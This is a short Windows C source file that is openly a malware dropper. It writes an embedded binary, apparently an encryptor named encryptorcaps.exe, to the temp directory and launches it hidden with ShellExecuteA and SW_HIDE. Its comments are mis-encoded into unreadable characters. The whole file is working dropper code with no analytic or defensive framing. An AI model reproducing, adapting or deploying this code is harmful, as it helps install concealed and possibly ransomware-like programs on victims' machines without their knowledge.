#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include "encryptor_payload.h"  // ���⿡�� encryptorcaps_exe / encryptorcaps_exe_len �� ����

void drop_and_execute() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char exePath[MAX_PATH];
    snprintf(exePath, MAX_PATH, "%s\\encryptorcaps.exe", tempPath);

    FILE* fp = fopen(exePath, "wb");
    if (!fp) {
        MessageBoxA(NULL, "���� ���� ����!", "Dropper", MB_OK | MB_ICONERROR);
        return;
    }

    //  ��Ȯ�� ������ ���
    fwrite(encryptorcaps_exe, 1, encryptorcaps_exe_len, fp);
    fclose(fp);

    ShellExecuteA(NULL, "open", exePath, NULL, NULL, SW_HIDE);
}

int main() {
    drop_and_execute();
    return 0;
}